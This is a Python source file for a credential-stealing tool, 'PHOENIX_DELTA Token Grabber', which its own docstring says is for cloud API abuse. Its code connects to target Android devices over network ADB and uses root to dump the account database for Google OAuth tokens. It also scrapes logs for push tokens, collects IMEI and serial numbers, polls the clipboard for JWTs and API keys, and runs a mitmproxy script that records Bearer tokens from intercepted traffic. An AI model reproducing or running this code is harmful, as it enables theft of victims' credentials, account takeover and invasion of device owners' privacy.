"""
PHOENIX_DELTA v9.0 — Token Grabber
Extracts OAuth tokens, APNS tokens, and device identifiers from target devices.
Supports multiple extraction methods: ADB, MITM proxy, and clipboard monitoring.
"""

import asyncio
import json
import os
import re
import subprocess
from typing import Dict, Optional, List


class TokenGrabber:
    """
    Extracts authentication tokens from target devices for cloud API abuse.
    """

    def __init__(self):
        self.extracted_tokens: List[Dict] = []

    # ─── ADB-based Extraction ─────────────────────────────────────────

    async def adb_extract_google_oauth(self, device_ip: str) -> Dict:
        """
        Extract Google OAuth tokens via ADB.
        Pulls account data from the device's account database.
        """
        proc = await asyncio.create_subprocess_shell(
            f"adb connect {device_ip}:5555 && "
            f"adb -s {device_ip}:5555 shell 'su -c \"cat /data/system/users/0/accounts_ce.db\"' "
            f"| sqlite3 -json - | jq '.[] | select(.type==\"com.google\")'",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

        result = {
            "device_ip": device_ip,
            "method": "adb_google_oauth",
            "tokens": [],
            "success": False,
        }

        if stdout:
            try:
                accounts = json.loads(stdout.decode())
                for account in accounts:
                    if "authtoken" in str(account):
                        result["tokens"].append({
                            "type": "google_oauth",
                            "account_name": account.get("name", ""),
                            "token": account.get("authtoken", ""),
                        })
                result["success"] = len(result["tokens"]) > 0
            except json.JSONDecodeError:
                pass

        return result

    async def adb_extract_apple_apns(self, device_ip: str) -> Dict:
        """
        Extract Apple Push Notification token via ADB/debug bridge.
        """
        proc = await asyncio.create_subprocess_shell(
            f"adb connect {device_ip}:5555 && "
            f"adb -s {device_ip}:5555 shell "
            f"'logcat -d | grep -i \"apns-token\\|push-token\\|device-token\" | head -5'",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)

        result = {
            "device_ip": device_ip,
            "method": "adb_apns_extract",
            "tokens": [],
            "success": False,
        }

        if stdout:
            output = stdout.decode()
            token_patterns = [
                r"device[-_]?token[:\s]+([a-fA-F0-9]{64})",
                r"apns[-_]?token[:\s]+([a-fA-F0-9]{64})",
                r"push[-_]?token[:\s]+([a-fA-F0-9]{64})",
            ]
            for pattern in token_patterns:
                matches = re.findall(pattern, output, re.IGNORECASE)
                for match in matches:
                    result["tokens"].append({
                        "type": "apple_apns",
                        "token": match,
                    })

            result["success"] = len(result["tokens"]) > 0

        return result

    async def adb_extract_device_info(self, device_ip: str) -> Dict:
        """Extract device identifiers: IMEI, UDID, model, OS version."""
        commands = {
            "imei": "service call iphonesubinfo 1 | grep -o '\"[0-9a-f]\\{8\\} \"' | tail -n+3",
            "model": "getprop ro.product.model",
            "brand": "getprop ro.product.brand",
            "android_version": "getprop ro.build.version.release",
            "security_patch": "getprop ro.build.version.security_patch",
            "serial": "getprop ro.serialno",
        }

        result = {
            "device_ip": device_ip,
            "method": "adb_device_info",
            "info": {},
            "success": False,
        }

        for key, cmd in commands.items():
            proc = await asyncio.create_subprocess_shell(
                f"adb connect {device_ip}:5555 && "
                f"adb -s {device_ip}:5555 shell '{cmd}'",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            if stdout:
                result["info"][key] = stdout.decode().strip()

        result["success"] = len(result["info"]) >= 3
        return result

    # ─── MITM Proxy Extraction ────────────────────────────────────────

    async def mitm_extract_tokens(self, proxy_port: int = 8080) -> Dict:
        """
        Intercept tokens via MITM proxy (mitmproxy/burp).
        Monitors HTTP traffic for Authorization headers and OAuth tokens.
        """
        result = {
            "method": "mitm_proxy",
            "tokens": [],
            "success": False,
        }

        # Start mitmproxy with token capture script
        script_content = '''
from mitmproxy import http
import json, re

def response(flow: http.HTTPFlow):
    auth_header = flow.request.headers.get("Authorization", "")
    if auth_header.startswith("Bearer "):
        token = auth_header[7:]
        data = {
            "url": flow.request.pretty_url,
            "token": token,
            "host": flow.request.host,
        }
        with open("/app/db/mitm_tokens.jsonl", "a") as f:
            f.write(json.dumps(data) + "\\n")
'''

        os.makedirs("/app/db", exist_ok=True)
        with open("/tmp/mitm_capture.py", "w") as f:
            f.write(script_content)

        proc = await asyncio.create_subprocess_shell(
            f"mitmproxy --listen-port {proxy_port} "
            f"-s /tmp/mitm_capture.py --set stream_large_bodies=0",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Wait for captures
        await asyncio.sleep(30)
        proc.terminate()

        # Parse captured tokens
        token_file = "/app/db/mitm_tokens.jsonl"
        if os.path.exists(token_file):
            with open(token_file) as f:
                for line in f:
                    try:
                        data = json.loads(line.strip())
                        result["tokens"].append({
                            "type": "mitm_bearer",
                            "host": data.get("host", ""),
                            "token": data.get("token", ""),
                            "url": data.get("url", ""),
                        })
                    except json.JSONDecodeError:
                        pass

        result["success"] = len(result["tokens"]) > 0
        return result

    # ─── Clipboard Monitoring ─────────────────────────────────────────

    async def monitor_clipboard(self, device_ip: str,
                                 duration: int = 60) -> Dict:
        """
        Monitor device clipboard for pasted tokens/credentials.
        """
        result = {
            "device_ip": device_ip,
            "method": "clipboard_monitor",
            "tokens": [],
            "success": False,
        }

        proc = await asyncio.create_subprocess_shell(
            f"adb connect {device_ip}:5555 && "
            f"for i in $(seq 1 {duration}); do "
            f"  adb -s {device_ip}:5555 shell 'su -c \"cat /dev/clipboard\"' 2>/dev/null; "
            f"  sleep 1; "
            f"done",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=duration + 10)

        if stdout:
            output = stdout.decode()
            # Look for token patterns
            token_patterns = [
                (r"ya29\.[A-Za-z0-9_-]+", "google_oauth"),
                (r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+", "jwt_token"),
                (r"sk-[a-zA-Z0-9]{32,}", "api_key"),
                (r"[a-f0-9]{64}", "possible_token"),
            ]
            for pattern, token_type in token_patterns:
                matches = re.findall(pattern, output)
                for match in matches:
                    result["tokens"].append({
                        "type": token_type,
                        "token": match,
                    })

        result["success"] = len(result["tokens"]) > 0
        return result

    # ─── Bulk Extraction ──────────────────────────────────────────────

    async def extract_all(self, device_ip: str) -> Dict:
        """
        Run all extraction methods against a target device.
        """
        results = {
            "device_ip": device_ip,
            "extractions": [],
            "all_tokens": [],
        }

        # Device info
        info = await self.adb_extract_device_info(device_ip)
        results["extractions"].append(info)

        # Google OAuth
        google = await self.adb_extract_google_oauth(device_ip)
        results["extractions"].append(google)
        results["all_tokens"].extend(google.get("tokens", []))

        # APNS
        apns = await self.adb_extract_apple_apns(device_ip)
        results["extractions"].append(apns)
        results["all_tokens"].extend(apns.get("tokens", []))

        # Clipboard
        clip = await self.monitor_clipboard(device_ip, duration=30)
        results["extractions"].append(clip)
        results["all_tokens"].extend(clip.get("tokens", []))

        self.extracted_tokens.extend(results["all_tokens"])
        return results


async def main():
    """CLI entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="PHOENIX_DELTA Token Grabber")
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--method", default="all",
                        choices=["adb", "mitm", "clipboard", "all"])
    args = parser.parse_args()

    grabber = TokenGrabber()

    if args.method == "all":
        results = await grabber.extract_all(args.target_ip)
    elif args.method == "adb":
        results = await grabber.adb_extract_google_oauth(args.target_ip)
    elif args.method == "mitm":
        results = await grabber.mitm_extract_tokens()
    elif args.method == "clipboard":
        results = await grabber.monitor_clipboard(args.target_ip)

    print(json.dumps(results, indent=2, default=str))


if __name__ == "__main__":
    asyncio.run(main())
